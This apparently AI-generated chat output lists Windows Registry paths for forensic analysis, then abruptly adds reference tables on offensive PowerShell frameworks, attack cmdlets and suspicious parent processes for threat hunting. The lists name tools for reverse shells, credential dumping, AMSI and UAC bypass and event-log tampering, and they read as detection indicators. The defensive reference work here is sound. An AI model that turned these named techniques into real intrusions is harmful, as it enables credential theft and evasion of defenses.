- SAM\Domains\Account\Users

**5. USB Device History**

- Device volume names:\
  HKLM\SOFTWARE\Microsoft\Windows\PortableDevices\Devices

- Device identification history:\
  HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR\
  HKLM\SYSTEM\CurrentControlSet\Enum\USB

- First and last connection/removal timestamps:\
  HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR\\Vendor_Product_Version\>\\USBSerial#\>\Properties\\83da6326-97a6-4088-9453-a19231573b29}

  - 0064 = First connection

  - 0066 = Last connection

  - 0067 = Last removal

**6. Bluetooth Devices**

- HKLM\SYSTEM\CurrentControlSet\Services\BTHPORT\Parameters\Devices

**7. File and Folder Usage**

- **Recent Files:**\
  NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs

- **Office Recent Files:**\
  NTUSER.DAT\Software\Microsoft\Office\\VERSION\>\UserMRU\LiveID\_\<UserID\>\FileMRU

- **ShellBags (folder view history):**\
  USRCLASS.DAT\Local Settings\Software\Microsoft\Windows\Shell\Bags\
  USRCLASS.DAT\Local Settings\Software\Microsoft\Windows\Shell\BagMRU\
  NTUSER.DAT\Software\Microsoft\Windows\Shell\BagMRU\
  NTUSER.DAT\Software\Microsoft\Windows\Shell\Bags

**8. Open/Save and Last Visited Dialogs**

- NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePIDLMRU

- NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU

**9. Windows Explorer Address/Search Bars**

- NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths

- NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery

**10. Program Execution History**

- **UserAssist Data:**\
  NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\\GUID}\Count

- **ShimCache (AppCompatCache):**\
  HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache

**11. Background and Desktop Activity Monitoring (Windows 8 and above)**

- **Background Activity Moderator (BAM):**\
  HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\\SID}

- **Desktop Activity Monitor (DAM):**\
  HKLM\SYSTEM\CurrentControlSet\Services\dam\UserSettings\\SID}

Absolutely! Here’s both a **structured document** and a **concise checklist** for Windows Registry Forensic Analysis based on your data:

------------------------------------------------------------------------

**Windows Registry Forensic Analysis**

**Structured Document**

------------------------------------------------------------------------

**1. Account and System Information**

- **OS Version**\
  Registry Path:\
  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion

- **Current Control Set**\
  Registry Paths:\
  HKLM\SYSTEM\CurrentControlSet\
  HKLM\SYSTEM\Select\Current\
  HKLM\SYSTEM\Select\LastKnownGood

- **Computer Name**\
  Registry Path:\
  HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName

- **Time Zone Information**\
  Registry Path:\
  HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation

------------------------------------------------------------------------

**2. Network Interfaces and Past Networks**

- Registry Path:\
  HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces

------------------------------------------------------------------------

**3. Autostart Programs**

- **User-specific autostart:**\
  NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run\
  NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce

- **System-wide autostart:**\
  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\
  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

------------------------------------------------------------------------

**4. User Accounts (SAM Hive)**

- Registry Path:\
  SAM\Domains\Account\Users

------------------------------------------------------------------------

**5. USB Device History**

- **Device Volume Names:**\
  HKLM\SOFTWARE\Microsoft\Windows\PortableDevices\Devices

- **Device Identification (History):**\
  HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR\
  HKLM\SYSTEM\CurrentControlSet\Enum\USB

- **Connection Timestamps:**\
  Path Template:\
  HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR\\Vendor_Product_Version\>\\USBSerial#\>\Properties\\83da6326-97a6-4088-9453-a19231573b29}\
  Values:

  - 0064 = First connection time

  - 0066 = Last connection time

  - 0067 = Last removal time

------------------------------------------------------------------------

**6. Bluetooth Devices**

- Registry Path:\
  HKLM\SYSTEM\CurrentControlSet\Services\BTHPORT\Parameters\Devices

------------------------------------------------------------------------

**7. File and Folder Usage**

- **Recent Files:**\
  NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs

- **Office Recent Files:**\
  NTUSER.DAT\Software\Microsoft\Office\\VERSION\>\UserMRU\LiveID\_\<UserID\>\FileMRU

- **ShellBags (Folder View History):**\
  USRCLASS.DAT\Local Settings\Software\Microsoft\Windows\Shell\Bags\
  USRCLASS.DAT\Local Settings\Software\Microsoft\Windows\Shell\BagMRU\
  NTUSER.DAT\Software\Microsoft\Windows\Shell\BagMRU\
  NTUSER.DAT\Software\Microsoft\Windows\Shell\Bags

------------------------------------------------------------------------

**8. Open/Save and Last Visited Dialogs**

- Registry Paths:\
  NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePIDLMRU\
  NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU

------------------------------------------------------------------------

**9. Windows Explorer Address/Search Bars**

- Registry Paths:\
  NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths\
  NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery

------------------------------------------------------------------------

**10. Program Execution History**

- **UserAssist Data:**\
  NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\\GUID}\Count

- **ShimCache (AppCompatCache):**\
  HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache

------------------------------------------------------------------------

**11. Background and Desktop Activity Monitoring (Windows 8+)**

- **Background Activity Moderator (BAM):**\
  HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\\SID}

- **Desktop Activity Monitor (DAM):**\
  HKLM\SYSTEM\CurrentControlSet\Services\dam\UserSettings\\SID}

------------------------------------------------------------------------

**Compiled by:** Abdul Shareef Pallivalappil

------------------------------------------------------------------------

**Windows Registry Forensic Analysis Checklist**

| **Forensic Focus** | **Registry Path / Location** | **Notes** |
|----|----|----|
| OS Version | HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion | System version info |
| Current Control Set | HKLM\SYSTEM\CurrentControlSetHKLM\SYSTEM\Select\CurrentHKLM\SYSTEM\Select\LastKnownGood | Active & last known good config |
| Computer Name | HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName | Hostname |
| Time Zone Info | HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation | Time zone settings |
| Network Interfaces | HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces | Network config |
| Autostart Programs (User) | NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunRunOnce | User autostart apps |
| Autostart Programs (System) | HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunRunOncePolicies\Explorer\Run | System-wide autostart |
| User Accounts (SAM Hive) | SAM\Domains\Account\Users | Local user accounts |
| USB Device History | HKLM\SOFTWARE\Microsoft\Windows\PortableDevices\DevicesHKLM\SYSTEM\CurrentControlSet\Enum\USBSTORUSB | USB device connections & IDs |
| USB Connection Times | USBSTOR\\Vendor\>\\Serial#\>\Properties\\GUID} Values: 0064 (first), 0066 (last connect), 0067 (last removal) | Connection timeline |
| Bluetooth Devices | HKLM\SYSTEM\CurrentControlSet\Services\BTHPORT\Parameters\Devices | Paired BT devices |
| Recent Files | NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs | Recent user files |
| Office Recent Files | NTUSER.DAT\Software\Microsoft\Office\\VERSION\>\UserMRU\LiveID\_\<UserID\>\FileMRU | MS Office MRUs |
| ShellBags (Folder Views) | USRCLASS.DAT\Local Settings\Software\Microsoft\Windows\Shell\BagsBagMRUNTUSER.DAT\Software\Microsoft\Windows\Shell\Bags | Folder viewing history |
| Open/Save Dialog MRUs | NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePIDLMRULastVisitedPidlMRU | File dialog history |
| Explorer Address/Search Bars | NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPathsWordWheelQuery | Explorer address history |
| Program Execution History | NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\\GUID}\CountAppCompatCache | Execution and run history |
| Background & Desktop Activity | HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\\SID}dam\UserSettings\\SID} | Activity monitoring on Win8+ |

------------------------------------------------------------------------

Would you like this delivered in a Word, PDF, or markdown file format for easy reference or printing?

**Here’s the expanded version with short explanations for each framework, command, and suspicious parent process so the list becomes educational and practical.**

------------------------------------------------------------------------

**🔥 Well-Known PowerShell Offensive Frameworks (with explanations)**

| **Framework** | **Purpose / Use** |
|----|----|
| **PowerSploit** | A popular post-exploitation toolkit with modules for privilege escalation, persistence, and reconnaissance. |
| **PowerCat** | PowerShell equivalent of Netcat, used for creating reverse shells and tunneling connections. |
| **Empire** | Full-featured post-exploitation framework with agent-based communication, credential theft, and lateral movement. |
| **DarkObserver** | Framework focused on stealthy monitoring and persistence techniques. |
| **PowerMemory** | Extracts credentials directly from memory without touching disk, bypassing traditional defenses. |
| **Invoke-Mimikatz** | PowerShell wrapper for Mimikatz, used to dump credentials, hashes, and Kerberos tickets. |
| **Invoke-Mimikittenz** | Captures sensitive data from memory, such as passwords typed into browsers. |
| **Offensive-PowerShell** | Collection of offensive scripts for enumeration, exploitation, and evasion. |
| **Kautilya** | Toolkit for malicious payloads on USB devices (e.g., HID attacks). |
| **Nishang** | Large collection of offensive and post-exploitation scripts for red teaming and penetration testing. [Github](https://github.com/samratashok/nishang) |
| **PoshRat** | RAT (Remote Access Trojan) built in PowerShell for persistence and control. |
| **PowerShell Suite** | General-purpose offensive scripts for exploitation and reconnaissance. |
| **OWA-Toolkit** | Targets Outlook Web Access for credential harvesting and exploitation. |
| **Sherlock** | Privilege escalation checker that identifies vulnerable Windows services. |
| **Invoke-Phant0m** | Hides malicious activity by disabling Windows Event Log service threads. |

------------------------------------------------------------------------

**🎯 Offensive Cmdlets & Functions**

These are **red-flag indicators** when seen in PowerShell scripts or logs:

- Get-GPPPassword → Extracts Group Policy Preferences passwords.

- Get-Keystrokes → Keylogger functionality.

- Get-MicrophoneAudio → Records audio from microphone.

- Get-ModifiablePath → Finds paths vulnerable to privilege escalation.

- Get-TimedScreenshot → Captures periodic screenshots.

- Invoke-AllChecks → Runs multiple system checks for privilege escalation.

- Invoke-AmsiBypass → Disables AMSI (Anti-Malware Scan Interface).

- Invoke-DllInjection → Injects DLLs into processes.

- Invoke-Mimikatz → Credential theft.

- Invoke-NinjaCopy → Copies locked files stealthily.

- Invoke-PsUACme → Bypasses User Account Control (UAC).

- Invoke-ReflectivePEInjection → Loads executables into memory without touching disk.

- Invoke-Shellcode → Executes raw shellcode.

- **PowerUp** → Privilege escalation checks.

- **PowerView** → Active Directory enumeration and exploitation. [benjitrapp.github.io](https://benjitrapp.github.io/attacks/2024-01-04-offensive-powershell/)

------------------------------------------------------------------------

**⚠️ Suspicious PowerShell Parent Processes**

PowerShell launched from these processes is **highly suspicious**, since they are not typical parents:

| **Process** | **Why Suspicious** |
|----|----|
| chrome.exe, firefox.exe, safari.exe, vivaldi.exe, microsoftedge.exe | Browsers rarely spawn PowerShell; indicates exploitation via malicious scripts. |
| excel.exe, winword.exe, powerpnt.exe, visio.exe, msaccess.exe, mspub.exe | Office apps spawning PowerShell suggests malicious macros or embedded scripts. |
| outlook.exe | Email client launching PowerShell → phishing payload execution. |
| regsvr32.exe, rundll32.exe, mshta.exe | Living-off-the-land binaries often abused to execute PowerShell. |
| httpd.exe, nginx.exe, php-cgi.exe, tomcat, w3wp.exe | Web servers spawning PowerShell → webshell or exploitation. |
| sqlserver.exe, sqlservr.exe, sqlagent.exe | Database services rarely invoke PowerShell; indicates compromise. |
| services.exe, wmiprvse.exe, jbosssvc.exe | Service processes spawning PowerShell → persistence or lateral movement. |
| amigo.exe, browser.exe | Uncommon executables; often renamed malware droppers. [Fortinet Online Help](https://help.fortinet.com/fsiem/Public_Resource_Access/7_1_3/rules/PH_RULE_Suspicious_PowerShell_Parent_Process.htm) |

------------------------------------------------------------------------

✅ **Key takeaway:** These frameworks and cmdlets are powerful offensive tools, but defenders can detect them by monitoring **PowerShell command lines, script blocks, and unusual parent processes**.

Would you like me to also create a **visual detection cheat sheet** (like a table mapping each framework/cmdlet to MITRE ATT&CK techniques) so it’s easier to use in threat hunting?
